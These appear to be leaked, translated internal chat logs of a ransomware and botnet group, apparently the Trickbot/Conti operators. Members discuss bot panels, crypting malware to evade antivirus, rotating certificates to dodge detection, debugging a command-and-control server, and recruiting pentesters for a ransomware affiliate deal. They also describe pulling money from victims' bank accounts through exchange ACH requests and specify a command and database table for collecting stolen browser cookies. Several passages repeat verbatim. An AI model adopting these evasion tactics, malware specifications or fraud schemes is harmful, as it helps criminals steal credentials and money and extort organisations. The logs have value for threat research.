there were 19 in total, there were 5 more than 10kk, 3 offs, in the remaining 2 they could not jump
[Error: The message is encrypted and cannot be decrypted.]
[Error: The message is encrypted and cannot be decrypted.]
he says there were 500-600 bots there
yeah) If only. The admin panel is still buggy there, I can\u2019t say how much, along with vg, but 500-600 were definitely not there. A maximum of 100 along with vg, and then they lied.
There are only av. 14760, and 19 corps - all
For bots in general, everything is bad now. They don't go at all. Tomorrow we will try with balzac
Such a thing.\nIn general, I found the code that is responsible for uploading, apparently it was sharpened to a slightly different format. There are links like rackspace and the format is short\nIt turned out to unload in the format link:login:pass. The format setting that you are asking for is also there, but I have not been able to do it yet.\nIn this regard, 3 questions.\n1. How critical will it be if I complete this upload tomorrow?\n2. Should it be an exact match of the link or urls like app.servisetrade.com should also be in the selection?\n3. Bot id, is it its identifier like 971BB5287788095B1DBBCCA9B8CA3BB2 or internal id in admin panel like 156789678?
I can give access, you'll have a look
He simply looks by status, where imports is more than 22
Av also has one, that's why he said so much!

wow, now if only a fork of some kind of blockchain is done, created from scratch, it can take years. The main trilemma of blockchains: transaction speed, security and scalability.\nFor example, a full node of the ether can no longer be deployed on most computers, there is not enough space. The network commission sometimes goes off scale and the network becomes ineffective.

Hey!
Hey
about
please tell me the following
in my technical specifications for the bootloader it is written that it should be able to work through a proxy server
you on the server can register a proxy server?
Which server?
xs?
written in TK. I'm perplexed, but my team leader avoids talking, said - you need to test with the admins, contact them, they will prescribe a proxy server
apparently it is necessary to write this on test machines
the admin panel has nothing to do with the bootloader in terms of the execution environment
Throw off TK
I'll just copy the phrase now, there is one sentence
on this topic
\nThe loader must support work through a proxy if it is specified in the operating system settings (inetcpl.cpl -> Connection -> Proxy settings).
apparently it is assumed that the bootloader enters the system, where access to the Internet goes through a proxy server, and should not be confused. But how?
you can\u2019t tell me the progers with the bootloader so that I can contact them on this topic?

Hello. Here the love asks to disable the VNC functionality if the bot is reserved. How is the reservation going now?
So now it turns out from you to look at the speed of updating domains and disable vnc for others if the bot is reserved by someone alone, right7
Is there anything else, or are there no more tasks yet?
anything new...

you saw some kind of crypto project being launched there. I gave you some ideas, but you didn't answer.

I wrote to him to describe everything in detail to you
Understood
maybe he means about the biceps in the botlist, but this is not accurate

love writes importance up to 20 reached a lot on which and that's it.
Importance after all install modules?
Or admin?
admin panel
Lowe complains that it reaches importance 20 and does not go any further
And domains are not set
Does the admin set domains too?
I was sure that imports are in modules, I then looked for the code in which the rules for imports are set and did not find
rules in admin
have you decided with why the empty bots in pink appear?
Yes
Fixed it now shouldn't
Appear.
love writes that again there are a lot of av
i.e. empty
here importance rules /crud/importancerules
Weird. It means that bots are added somewhere else ..

need to figure it out
what about configs?
Well, love writes that he slows down
slows down * you write that there are empty bots
For the day everything works fine
In theory, if I copy the configs for the supervisor from there, it should start working like on the bottom.
That is if you try quickly.
Or can I still try to figure out why this is happening
And then this time will take
And with the grabber I will decide. I'll do it now
try changing the config
just save this one to rollback
Well yes, that's understandable

Hey
Some of the ransomware operations using this botnet for network access include the infamous Ryuk, Conti, REvil, as well as a new one called Diavol, the Romanian for Devil.\n\nSince Emotet\u2019s takedown by law enforcement, Trickbot activity started to increase to such levels that in May it was the most prevalent malware on Check Point\u2019s radar.\n\nThe malware is maintained its position this month, too, the cybersecurity company notes in a report today, adding that Trickbot\u2019s maintainers are constantly working to improve it.\n\nAccording to Check Point\u2019s telemetry, Trickbot impacted 7% of organizations across the world, followed by the XMRig cryptocurrency miner the Formbook info stealer, which affected 3% of the organizations that Check Point monitors worldwide.\nNew VNC module in the works\n\nIn another report, Romanian cybersecurity company Bitdefender says that its systems caught a new version of Trickbot's VNC module (vncDLL), used after compromising high-profile targets.\n\nThe updated module is called tvncDLL and allows the threat actor to monitor the victim and collect information that would enable pivoting to valuable systems on the network.\n\nAlthough tvncDLL was discovered on May 12, the Romanian researchers say that it is still under development, \u201csince the group has a frequent update schedule, regularly adding new functionalities and bug fixes.\u201d\n\nBitdefender\u2019s analysis of the module points out that it uses a custom communication protocol and reaches the command and control (C2) server through one of nine proxy IP addresses that enable access to victims behind firewalls.\n\nTrickbot's tvncDLL module attack overview\n\nThe VNC component can stop Trickbot and unload it from memory. When an operator initiates communication, the module creates a virtual desktop with a custom interface.\n\n\u201cDuring normal operation, the alternate desktop is created and fully controlled by the module, copying the icons from the desktop, creating a custom taskbar for managing its processes and creating a custom right-click menu, containing custom functionality,\u201d Bitdefender researchers write in their report.\n\nRight click menu for Trickbot's tvncDLL\n\nUsing the command prompt, the threat actor can download fresh payloads from the C2 server, open documents and the email inbox, steal data from the compromised system.\n\nAnother option called Native Browser fires up a web browser by taking advantage of the OLE automation feature in Internet Explorer.\n\nThe function is under development and its purpose is to steal passwords from Google Chrome, Mozilla Firefox, Opera, and Internet Explorer.\n\nTrickbot's tvncDLL Native Browser feature\n\nThe researchers say that while the old vncDLL module has been in use since at least 2018, its successor became active in the wild on May 11, 2021, according to evidence revealed during their investigation.\n\nTelemetry data from Bitdefender data shows Trickbot\u2019s C2 servers spread on almost all continents, with the largest number (54) located in North America. According to the company, the number of C2 servers has increased significantly this year, jumping from around 40 in January to more than 140 in June.\nrelated articles:\n\nSoftware maker removes \"backdoor\" giving root access to radio devices\n\nBazarBackdoor sneaks in through nested RAR and ZIP archives\n\nTrickbot cybercrime group linked to new Diavol ransomware\n\nUS charges Latvian for helping develop the Trickbot malware\n\nNew BazaFlix attack pushes BazarLoader malware via fake movie site

Some of the ransomware operations using this botnet for network access include the infamous Ryuk, Conti, REvil, as well as a new one called Diavol, the Romanian for Devil.\n\nSince Emotet\u2019s takedown by law enforcement, Trickbot activity started to increase to such levels that in May it was the most prevalent malware on Check Point\u2019s radar.\n\nThe malware is maintained its position this month, too, the cybersecurity company notes in a report today, adding that Trickbot\u2019s maintainers are constantly working to improve it.\n\nAccording to Check Point\u2019s telemetry, Trickbot impacted 7% of organizations across the world, followed by the XMRig cryptocurrency miner the Formbook info stealer, which affected 3% of the organizations that Check Point monitors worldwide.\nNew VNC module in the works\n\nIn another report, Romanian cybersecurity company Bitdefender says that its systems caught a new version of Trickbot's VNC module (vncDLL), used after compromising high-profile targets.\n\nThe updated module is called tvncDLL and allows the threat actor to monitor the victim and collect information that would enable pivoting to valuable systems on the network.\n\nAlthough tvncDLL was discovered on May 12, the Romanian researchers say that it is still under development, \u201csince the group has a frequent update schedule, regularly adding new functionalities and bug fixes.\u201d\n\nBitdefender\u2019s analysis of the module points out that it uses a custom communication protocol and reaches the command and control (C2) server through one of nine proxy IP addresses that enable access to victims behind firewalls.\n\nTrickbot's tvncDLL module attack overview\n\nThe VNC component can stop Trickbot and unload it from memory. When an operator initiates communication, the module creates a virtual desktop with a custom interface.\n\n\u201cDuring normal operation, the alternate desktop is created and fully controlled by the module, copying the icons from the desktop, creating a custom taskbar for managing its processes and creating a custom right-click menu, containing custom functionality,\u201d Bitdefender researchers write in their report.\n\nRight click menu for Trickbot's tvncDLL\n\nUsing the command prompt, the threat actor can download fresh payloads from the C2 server, open documents and the email inbox, steal data from the compromised system.\n\nAnother option called Native Browser fires up a web browser by taking advantage of the OLE automation feature in Internet Explorer.\n\nThe function is under development and its purpose is to steal passwords from Google Chrome, Mozilla Firefox, Opera, and Internet Explorer.\n\nTrickbot's tvncDLL Native Browser feature\n\nThe researchers say that while the old vncDLL module has been in use since at least 2018, its successor became active in the wild on May 11, 2021, according to evidence revealed during their investigation.\n\nTelemetry data from Bitdefender data shows Trickbot\u2019s C2 servers spread on almost all continents, with the largest number (54) located in North America. According to the company, the number of C2 servers has increased significantly this year, jumping from around 40 in January to more than 140 in June.\nrelated articles:\n\nSoftware maker removes \"backdoor\" giving root access to radio devices\n\nBazarBackdoor sneaks in through nested RAR and ZIP archives\n\nTrickbot cybercrime group linked to new Diavol ransomware\n\nUS charges Latvian for helping develop the Trickbot malware\n\nNew BazaFlix attack pushes BazarLoader malware via fake movie site

In general, the last time he ran pvgrab 17\nWe 17 at 3 a.m. had not yet completed the day then, perhaps it didn\u2019t reach\nNow he is off, I tried to find something in the logs - a lot of errors, I need to finish the dero to exclude that the pool has a password in a different encoding
Lots of problems with it now.
Maybe he also has an example of a bot

there are owners of exchanges?
in short, the exchange can request grandmas from the account
banana for example
you knit an acc to the exchange and then you just make a request from the account to the ACH transfer and it goes to the balance of the exchange, i.e. you don\u2019t need to make a transfer from the bank account. I have accounts with large balances, but banks are self-regulating and cannot be sent from them by transfers, only pull money from them, here the exchanges are a normal topic, but on the top exchanges the limit is 5k a day, I thought maybe you have exchange owners

This is my suggestion. Buza also threw in 2 more proposals there, but if I focused more on the functionality, then he drowns more for the technical part.\n\nAnd I attached several articles from the exploit contest, you can try to pull up these guys if you like one of them by authorship.
I pulled up a team of arbitrageurs, they make traffic globally from fb and google, they have their own loader, but they deal with the crypto theme in general, suggested that they try to work on grids, I say you do traffic, we track networks ourselves, if we share anything, and the logs on the crypt and others that arrive - all to them. Should launch next week.\n\nTom also seems to be starting from PND, we provided him with everything he needed\n\nI got an offer from supposedly competitors, a crylock affiliate program - they say they broke down there, they have pentesters, targets, they only need a locker. I say ok, we will give for 30%, they rested, they say a lot. It is necessary to hold them down and try to steal advers and pentesters from them, I think how to do it)))\n\n \" akonitborec@thesecure.biz In general, I am the admin of another cryptolocker, not so popular - crylock. And now we have a hitch there and we will rewrite it for a long time. Therefore, so that my work does not disappear, I am looking for a new locker partner. I have several teams of pentesters, several independent pentesters and my own targets of all kinds.I only need a locker, but in fact 30% will not suit me.Because large teams worked for me for a smaller percentage, and I still have to earn something on administration \"Your locker fell into my hands from intermediaries and I tested it, it's not bad, so I wrote. If you have a more interesting offer for%, then I'm ready to consider it.\"\n\n\nWe brought pentesters to Horsa there, found a few more coders this week, the recruitment is slowly moving forward.\n\nI collected all the reports on the modules and bugs of the trick, while we have the main problem with importdll and superbrowser, everything else works fine, everything has been cleaned/updated. With vnc is not yet understood, but everything is in the process
By the way, we also have a loader with an admin panel in the torus. Just like arbitrators. Only written, was not in battle, and is launched with an OV sert bypassing the smartscreen. If you suddenly need some topics ..
Hey
Hey
Question from a subscriber (admin panel coder):\n\nListen, do you happen to know why the corporate section is needed in the admin panel?\nThere it accumulates domains that pass through us and collects titles like title, description on them\nIs it currently in use?

Archived txt and pictures\n\n123123098098!!!\nhttps://privatlab.com/s/v/AEE6gRkkN0f74V0N9JjD\nhttps://privatlab.com/s/d/AEE6gRkkN0f74V0N9JjD/G3obq#delete\n\nThere are different options for the logo, fonts and design in general, and some promotional materials for the start, description and functionality, development plan. This is my suggestion. Buza also threw in 2 more proposals there, but if I focused more on the functionality, then he drowns more for the technical part.\n\nAnd I attached several articles from the exploit contest, you can try to pull up these guys if you like one of them by authorship.
I pulled up a team of arbitrageurs, they make traffic globally from fb and google, they have their own loader, but they deal with the crypto theme in general, suggested that they try to work on grids, I say you do traffic, we track networks ourselves, if we share something, and the logs on the crypt and others that arrive - all to them. Should launch next week.\n\nTom also seems to be starting from PND, we provided him with everything he needed\n\nI got an offer from supposedly competitors, a crylock affiliate program - they say they broke down there, they have pentesters, targets, they only need a locker. I say ok, we will give for 30%, they rested, they say a lot. It is necessary to hold them down and try to steal advers and pentesters from them, I think how to do it)))\n\n \" akonitborec@thesecure.biz In general, I am the admin of another cryptolocker, not so popular - crylock. And now we have a hitch there and we will rewrite it for a long time. Therefore, so that my work does not disappear, I am looking for a new locker partner. I have several teams of pentesters, several independent pentesters and my own targets of all kinds.I only need a locker, but in fact 30% will not suit me.Because large teams worked for me for a smaller percentage, and I still have to earn something on administration \"Your locker fell into my hands from intermediaries and I tested it, it's not bad, so I wrote. If you have a more interesting offer for%, then I'm ready to consider it.\"\n\n\nWe brought pentesters to Horsa there, found a few more coders this week, the recruitment is slowly moving forward.\n\nI collected all the reports on the modules and bugs of the trick, while we have the main problem with importdll and superbrowser, everything else works fine, everything has been cleaned/updated. With vnc is not yet understood, but everything is in the process
By the way, we also have a loader with an admin panel in the torus. Just like arbitrators. Only written, was not in battle, and is launched with an OV sert bypassing the smartscreen. If you suddenly need some topics ..
Question from a subscriber (admin panel coder):\n\nListen, do you happen to know why the corporate section is needed in the admin panel?\nThere it accumulates domains that pass through us and collects titles like title, description on them\nIs it currently in use?

some kind of fucked up again with crypts, the outlet complains that only honeypots are flying from their downloads. For some reason I'm sure that they crookedly load. I reason like this. Once he tapped out the file from the honeypot, he will tap out from the sucker too. Another question is how they give it away, if they spam big attachments there - honeypots are inevitable .. I requested reports on crypts and stubs - everything works. Hof cleans the sources. So I don't see a problem on our end. Tomorrow I'll test everything on my virtual machines with pens, we'll figure it out. But most likely they are either crookedly spamming or cock bases..

hello bro
According to the crypts, everyone was brainwashed, we will first look for an alternative to Dinchek (he behaves somehow inappropriately and checks for too long), well, we will watch the runtime tomorrow. According to all reports, we have everything purely on statics, and even the fact that it is checked by hand for runtime is said purely. Either they fuck, or the advers somehow crookedly load, since the honeypots are knocking and there are no living cars
booze there with an outlet, they started some kind of garbage in my opinion. they want to supposedly gather all our spammers into one chat, I think that this will already be superfluous .. Firstly, because there are 4 intermediaries out of 5 spammers ..

well, there you will get a price tag from these IP info
there is a subscription of 15k per month
with discount))
per year 150k
I'm here
let's
discuss
I already gave a lot to the netwalker
no result
Sure! I think in your other email, you specified that you will like the following datasets:\n\n    IP to Geolocation\n    IP to ASN\n    IP to Company\n    IP to Carrier Detection\n    Privacy/VPN Detection\n    IP WHOIS (RWHOIS + RIR)\n    hosted domains\n\nWhich pretty much constitutes as all our datasets and we offer a great combined price of USD15k/month for monthly updates. Weekly will be USD18k/month and daily will be closer to USD20k/month. Note that for all 3 options, we offer the standard 2 months discount (so x10 instead of x12) if you pay a year up front e.g. USD150k/year for monthly updates.\n\nHope that made sense and let me know if pricing works for you! I can also get an official quote out for you if you like.\n\nCheers\nKen

right now, a situation arose that one of the encoders raised his own salary from 2 to 2.5k, I say, who raised it to you with whom you coordinated it? And he says the headhunter is constantly bombing mailings from our company and he has been tracking the rate for a long time, supposedly from a job offer that comes from work))))
Offers from our company come to the email \ud83d\ude42\n19:38\nHow is that\n19:38\nhead hunter writes and rates points\n19:38\nunderstood))\nIt\u2019s just that no one tells me anything, as usual, I\u2019ll find out everything myself))))\n19:39\nYes, it was like that - once Stern said let's throw 70k, I thought it was a one-time thing. Then the offer comes to the email\nWell, etc.\n3 times came
it is necessary that they can change accounts from which they are looking for people, we will get so fired up sooner or later specifically .. I think that there are a lot of snakes around with such an approach to security ..
the most discussed guys in our field, and a lot of things are constantly leaking, either infrastructure, or files .. right now it turns out that it\u2019s bullshit to keep track of us, because for years they\u2019ve been pouring from the same accounts

Hi OK. What you said, I did, wrote to Zeus. But he hasn\u2019t said anything about BK yet, but I communicate with him from time to time. Plus, I am aware when he has some other problems with the admin panel or other modules. With coders and testers in touch, now we are trying to fix the import. According to vnts and antiquity in the process, encoders are trying to rebuild.

Hey

The encrypted message received from professor@q3mcco35auwcstmt.onion is unreadable, as you are not currently communicating privately.
Sure! I think in your other email, you specified that you will like the following datasets:\n\n    IP to Geolocation\n    IP to ASN\n    IP to Company\n    IP to Carrier Detection\n    Privacy/VPN Detection\n    IP WHOIS (RWHOIS + RIR)\n    hosted domains\n\nWhich pretty much constitutes as all our datasets and we offer a great combined price of USD15k/month for monthly updates. Weekly will be USD18k/month and daily will be closer to USD20k/month. Note that for all 3 options, we offer the standard 2 months discount (so x10 instead of x12) if you pay a year up front e.g. USD150k/year for monthly updates.\n\nHope that made sense and let me know if pricing works for you! I can also get an official quote out for you if you like.\n\nCheers\nKen
150k want discount

Hey
report rocked
I have a working acc, can not change until it's already charged
from next month for example
and another moment: since there are a lot of those who are looking for us now, can we somehow distribute the search (let some look for fresh resumes that are updated daily, while others look for old ones that were added six months ago)? because I found an excellent specialist a long time ago and found him just in the inactive ones, in those who threw in their resumes and forgot and did not update. but you yourself understand the responses will be more from those who are looking for fresh ones. what do you think?
Good afternoon, from August 1, 2020, hh.ru introduced the biggest change - it switched to a new model for working with resumes. Now the opening of one resume costs 60 rubles. Official hh rates are here https://hhcdn.ru/file/16899324.pdf I can give you access 10 times cheaper:\n \nHh.ru (Time according to Moscow time to choose from: 08:00-11:00, 11:00-13:00, 13:00-15:00, 15:00-17:00, 17:00-19:00, 19:00-00:00, 00:00-08:00)\n30 resumes per day\n    - week: 7 tr;\n    - 10 days: 9 tr;\n   \n \n40 resumes per day\n    - week: 9 tr;\n    - 10 days: 11 tr;

Hey
here?
[Error: The message is encrypted and cannot be decrypted.]
have a problem for you
here
speak
yeah
driver@ will hit you
there's a problem there
What's the problem ?
from real data there are errors in crash logs
and if you make a direct request manually, then it passes
something in the data
Hello.
Looks like I need to do some sort of validation.
that is, the data received does not match the expected
[Error: The message is encrypted and cannot be decrypted.]
[Error: The message is encrypted and cannot be decrypted.]
[Error: The message is encrypted and cannot be decrypted.]
[Error: The message is encrypted and cannot be decrypted.]
Well, you need to look at what kind of crash is there.
if you give a log. then I can guess what to fix
Hey
In dero from clients for some reason requests do not pass.\nI do not quite understand how it is possible to debug everything.\nIn the logs now crash.log accumulates this\n\nError in process <0.18346.8> on node 'dero_server@dedic-balatom-696506' with exit value:\nfunction_clause,[cowboy_protocol,parse_method,[<<>>,state,#Port<0.283971>,ranch_tcp,[cowboy_router,cowboy_handler],false,[listener,http,dispatch,['_', [],[['...'],[],http_handler,[limits,32768,1024,4096,102400,8529920,8388608,1024]]]],undefined,undefined,5, 1.100.4096.64.4096.100.5000.1628839189780 ,9,39,28,108,225,128,164,177,128,198,128,173,217,55,80,136,0,0,28,192,20,192,19,0,57,0,51,0,53,0,47,192,10,192,9,0,56,0,50,0 ,10,0,19,0,5,0,4,1,0,0,78,0,0,0,36,0,34,0,0,31,115,101,116,116,105,110,103,115,45,119,105,110,46,100,97,116,97,46,109,105 ,99,114,111,115,111,102,116,46,99,111,109,0,5,0,5,1,0,0,0,0,0,10,0,6,0,4,0,23,0,24,0,11,0 ,2,1,0,0,35,0,0,0,23,0,0,255,1,0,1,0>>],[file,\"src/cowboy_protocol.erl\",line, 168]]\n\n2021-08-13 10:19:44 =ERROR REPORT====\nRanch listener http had connection process started with cowboy_protocol:start_link/4 at <0.18346.8> exit with reason: function_clause,[cowboy_protocol,parse_method,[<<>>,state,#Port<0.283971>,ranch_tcp,[ cowboy_router,cowboy_handler],false,[listener,http,dispatch,['_',[],[['...'],[],http_handler,[limits,32768,1024,4096 ,102400,8529920,8388608,1024]]]],undefined,undefined,5,1,100,4096,64,4096,100,5000,1628839189780,<<22,3,2,0,151,1, 0,0,147,3,2,97,22,29,22,7,97,79,22,24,101,25,44,24,4128,204,23,9,39,28,10,25,128,164,177,128,19,128,173,17,55,80,136,0,28,192,20,19,28,1,57.0 51,0,53,0,47,192,10,192,9,0,56,0,50,0,10,0,19,0,5,0,4,1,0,0,78,0,0, 0.36,0,34,0,0,31,115,101,16,116,105,110,105,110,46,119,105,110,46,100,97,11,97,46,109,105,99,11,10,11,9111,102,116,46,99,111,109,5,5,51,0,5,5,5,5,0,0,0,5,5,5,1,0,0,0,0,0,0 10,0,6,0,4,0,23,0,24,0,11,0,2,1,0,0,35,0,0,0,23,0,0,255,1,0, 1,0>>],[file,\"src/cowboy_protocol.erl\",line,168]]
As I understand it, it falls somewhere at the entrance, I made the info level, but as I see it, there is not even data about the request that puts everything.
[Error: The message is encrypted and cannot be decrypted.]
I do it with my hands when everything is ok, but with my hands I make a request like /xxxx/TEST/60
As I understand it, from real clients there are several stages of interaction, it seems to me that somewhere in the first stages something is not received.
now look at the source
the driver will give you
[Error: The message is encrypted and cannot be decrypted.]
[Error: The message is encrypted and cannot be decrypted.]
I think he expects only values in the http data stream. and the input is empty
parse_method(<< C, Rest/bits >>, State, SoFar) ->\n case C of\n  $\\r -> error_terminate(400, State);\n  $\\s -> parse_uri(Rest, State, SoFar);\n  _ -> parse_method(Rest, State, << SoFar/binary, C >>)\n end.
here is the code
parse_method only works when there is an input data stream .. it expects a newline .. but in fact there is no data
[Error: The message is encrypted and cannot be decrypted.]
messed up everything. therefore falls
maybe the client forgets to insert a newline at the very end?
Is there a way to find out what it sends as input?\nIt turns out not valid http data?
I think yes not valid.
learn - apparently only modify the cowboy. This is a liba server for working with http
It's just strange that there the whole log is so full\nAbove, there can hardly be something else, but until I figure out these application crashes, I can\u2019t watch anything further
Sorry sent to the wrong place *
the crash log will always be full of something .. there are a lot of requests. something gets into the log for each
Usually when everything is ok, there is almost nothing there, and when it is bugged\nI have it as it is now filled in 5 minutes
Def it as a signal that something unexpected is happening
Yuzaet\nUsually errors are at the warning level, the error falls and everything is clear
We check the http request itself, the one who is responsible for this says that he had thoughts of what to see, thanks for the hint, I myself would break my head here because of what it could be.
) yu are wellcame .. they would still put up tasks
is there something going on with you?
I was thrown out of the mail from which I did the mailings (suspicion of breaking). and I do not know all the data that was specified during registration. I bought mail. I can\u2019t restore everything that I have gained now ((
now with a new one I will duplicate again. probably with gmail, they don\u2019t seem to block
Well, it's definitely not for me.)\nAsk your def, maybe he'll tell you

and I have a question here .. you do not know. ejabberd can be made to work through socks5 .. so that he makes connections to servers through a proxy?
How does your gill work in onion?
[Error: The message is encrypted and cannot be decrypted.]
Yes
setting up torrc
you specify the port of the redirect, which will receive the domain on the onion and send it to the localhost
and outgoing how to do? for example, so that the gill can hook up to another onion server?
this is already more difficult, apparently all outgoing traffic should be directed to Tor Sox
I did not connect between servers, no need
But in general, is this really possible?
I think yes

by vnc, brought to the pink start and getting data for the new vnc connection
on Monday we will start identification by ID in the list of VNC
by dpost we do data transfer with ssl, before that it worked without
came up with the generation of new certificates on the head gaskets on the trike every hour
which will give you a better response
and constant rotation of rotator pads
on mon we will start it all, now in the process
and we will extend this to bq and cobalt
+ the ssl parameters will constantly change there, that is, it will be more difficult to track by certificates and fingerprints
and other software

Hey\nI'm watching that new features appear, and I'm starting to worry. Here is a story that I was planning to go on vacation.\nI want to have time to relax, summer is already ending, I have a year without rest.\nIn this regard, I want to ask you not to throw new tasks for the next 3-4 weeks on the functionality. I will try today, maximum tomorrow on the AB check, I have the data, but I need to finish it with regular seasons.\n\nI will upload by tax, and fix the log post, finish the cookies with Nicholas and transfer the system to support, I don\u2019t know for sure yet, but we are discussing it.\nI will return from vacation and we will calmly develop the system further. Now I see that bugs are prioritized in order to work quietly 3 tasks (1 from you and 2 from robin).\nI will return from vacation and will be ready to continue developing the system and the features in it already.\nDo you think it is possible to limit requests for new features for now?
Hi ok
what else was added?
[Error: The message is encrypted and cannot be decrypted.]
I wrote that the Created field with the ability to sort is now available, You can make the newest bots.\nAnd the Group IPs checkbox gives us 1 type of 1 bot, the most recent one, what gives an offline bot, but you can make a filter by status and everything is OK then.
The field and the checkbox in the botlist section, the Check AV field I am completing, I will probably need some kind of filter so that only bots with / without AV can be received in the botlist?
Or is the field enough, and the filter is not needed?
I think so far only fields so that you can see which av are on the bot
Ok, I don't think that someone puts more than 2, I'll display the name (s) of AB in this column just for now.

In general, he asked me to fill in new assemblies of bots and test on the stand, agreed with the booze, now it will be necessary when evgen asks to fill in the stand first pour the module there\nWe will test and then already in production.
He will need a bot that is set to give to the stand
Now with accesses I decide on the stand the question will give him an acc
Another point, what rights to give testers at the stand in the admin panel?

Hey!
\n\nI don\u2019t want to knock or something like that, but we have such garbage everywhere and in everything, it really annoys me wildly, I try to move them all, but you can keep track of all the hell.\nAnd it comes to what an absurdity, like I order a server and wait a week, I myself write to everyone why they say they didn\u2019t give out, the answers are stupid, like the seller threw me. Or Lov, for example, had to buy an acc - I don\u2019t have PP accounts, and I can\u2019t buy them anywhere.\nHow much do I say pay there need bro? - 70 bucks. I say, well, why are you saying mudden chtoli, you couldn\u2019t make an acc yourself in a week and replenish / pay with VCC - I don\u2019t have VCC.

[12:54:28] <wertu> it's unusual to do a little type not in real size. I constantly increase something and so on. Well, it's not scary in general, if everything is reduced, it will only get better. I can do it right away, but I thought that it didn\u2019t make much sense, since you also need to understand the direction as a whole, and then continue to do everything carefully

Hello. How are you?\nwhat are your results?\nWhat are the tasks?\nWhat ideas do you have that can be added and improved?
Is there anyone among us who considers himself a guru of blockchain and trends. Who knows where to go in this direction and what to develop ... What ideas does anyone have
1) we want to create our own crypto system according to the type:\netherium, polkadot and binance smart chain, etc.\n\n2) Does anyone know more about this?\n\n3) Study these above system, code, principles of work. To build our own, where it will already be possible to stick NFT, DEFI, DEX and all the new trends that are and will be. So that others can already create their own coins, exchanges and projects on our system.

There, the point is not that they are brain-fuckers and will / will not pay, but in our attitude towards advers. Since we are the top partner, we must comply. From our side, everything should always be clear and on time. Moreover, we have such a resource involved. All the opportunities and conditions are there, you need to be more professional. And we always have one or the other. Either we write nonsense in chat rooms, or we don\u2019t answer patients for half a day. Naturally advery nervous after that.

Hey
ku
what did you decide?
balzac dumped not in the know where?
Thu for 7 days you can not see
Hey
you will be in touch
need help
Hello . in touch
yeah
write to the driver tomorrow afternoon
there in dero still need to figure it out
crashes are coming
you can finish the software so that it does not crash even if the data is not valid
i.e. the only problem is that shit in the log?
well, the suspicion is that it does not write to the database
can write readable information to the log
what's wrong
Well, there the HTTP protocol from the client side is not correct ..
I can't manage it
but is this exactly the case?
or change the one that works with http
exactly
on the server side?
what will help?
not sure it will help. but it might be something else.
at least it will be possible to intercept in the log. then it won't suck
let's do
I'm talking about \"no guarantee of results\" ..
I need you to figure out the driver and encoder of the module, help with this
tell me later how much
just without you it's a deaf phone
the encoder of the module says that everything seems to be normal, the driver does not see the data, but sees crashes
and has been going on for a long time
OK . I need to collect the config
OK

it is still not clear what it is at all - is it the value of the Data field? I can't guess
here from the first byte
let's put nginx between client and dero
this is the binary stream that comes to me ..
put
and there we can understand from the logs
and let it log all requests ..
OK now
I will change the port at dero, nginx will accept 8082
inquiry . body . answer
no driver added here
do you need it?
I do not know . . I just write here what I see in myself .. and who do I need xs
that's who generates it - he is needed ..
we need the incoming raw HTTP request as is
and you need an indication - what is crooked in it
[16:24:01] <defender> but, the driver has not been added here\ndefinitely needed
> we need the incoming raw HTTP request as is\nI have already shown what flies to me .. here is the raw data
Let's wait what the defender says
works for me
Listen
Do you know the HTTP protocol?
I know) I should generally expect there to be pure text
I have trouble with the word \"there\
but I don\u2019t) I only have difficulties in that. that I don't see normal http
[Error: The message is encrypted and cannot be decrypted.]
others too
POST/HTTP/1.1\ncontent type:\ncontent length:\ncontent encoding:\nTransfer-Encoding: multipart/form-data
then the request body
Are you saying that there are no headers at all?
did you download the files?
downloaded
they don't have HTTP headers
sometimes normal slips .. with POST\nbut it happens like this in files
that is, you receive a request without headers at all
[Error: The message is encrypted and cannot be decrypted.]
right?
[Error: The message is encrypted and cannot be decrypted.]
[Error: The message is encrypted and cannot be decrypted.]

well you saw what comes
because I rebooted tor on the server
this is of course a very strong postmodernism, but I can also assume that this is HTTP / 2.0
follow this
it's your responsibility
Should he even be there?
although I do not remember that at least one of the modules was redone to support it
I don't care so far nothing is clear from the files
it is still not clear what it is at all - is it the value of the Data field? I can't guess

Let's wait what the defender says
he shouldn't be there, but I can guess why he might be there
so there was no problem\nwho I see, only you and Elroy flew out
everyone else was there
e.g. as a result of a query conversion on a shim
well, in the good.raw file, http 1.1 shines through

or because someone converted the module to a winhttp stack with http/2 enabled and didn't tell anyone
well that's fucked up
and you can send good requests, you say normal POST skips?
so you can see that everything is fine
yes I can . right now filtrana

you need to find a green of 2 admins for purchasing and setting up a koba, you can look on the forums for someone with experience
or search and train through xx
super admins are not needed there, it is necessary that they know Linux and be able to monitor traffic
and most importantly, so that they can, for example, raise a web server and bind it to a domain, understand the settings of the hoster - dns, etc., plus they should understand the cloud providers azura amazon ocean, etc.

Hey
defender@q3mcco35auwcstmt.onion/Psi+ invites you to ttrr@conference.q3mcco35auwcstmt.onion
\nelon@q3mcco35auwcstmt.onion: Greetings. The spambot has been tested. Ready to issue the assembly as a dll. You only need two things:\n1) you need to find out for which bot dll, i.e. what entry point to make there (with what it will be launched)\n2) you need a server, the previous one is not paid for (or I see the wrong version), in general, you need to order it again, we can order and deploy, but confirmation is needed\nFor exe it's almost all the same. But for dll - you need to know how to make the entry points in the dll correctly

What bot can you test with? Bq? Or a trickbot?

1. Create a new command to get cookie data. For example, command code 84\n\n2. Create a table to store data (SQL pseudocode):\nCREATE TABLE cookies (\n  id SERIAL,\n  username VARCHAR(255),\n  browser VARCHAR(255)\n  domain VARCHAR(255)\n  cookie_name VARCHAR(255)\n  cookie_value VARCHAR(255)\n  created DATETIME,\n  expires DATETIME,\n  path VARCHAR(255)\n);\n\n3. Ensure that data is received in the following format:\n- plain text divided into lines.\nLine separator - can be either UNIX or DOS.\nOne line - one entry.\nRecord field separator - vertical bar |\nRecording format:\n\nusername|browser|domain|cookie_name|cookie_value|created|expires|path\\r\\n\n\nwhere\n\nusername - username\nbrowser - browser code (enum = chrome|ff|ie|edge)\ndomain - cookie domain\ncookie_name - cookie name\ncookie_value - cookie value\ncreated - date-time of creation, Unix time\nexpires - date-time of expiration, Unix time\npath - the URI path
To the fact that I did not have this dock. Where is the description of B64? This is part of the format.
no about the base64 .. obviously added it yourself
to escape characters
Well, this is what you need to add to the dock.\ncreated in seconds?
created_at i set myself as NOW()
You don\u2019t have to guess how the sump handles there, right?
a .there is another ..
let me check
What about NOW() in seconds?
forget about NOW() this is different
CREATE TABLE public.data84(\n    id_low bigint NOT NULL,\n    id_high bigint NOT NULL,\n    \"group\" character varying(64),\n    created_at timestamp without timezone,\n    usernametext,\n    browser text,\n    domain text,\n    cookie_nametext,\n    cookie_valuetext,\n    created text,\n    expires text,\n    path text\n);

Hey

made
Hey
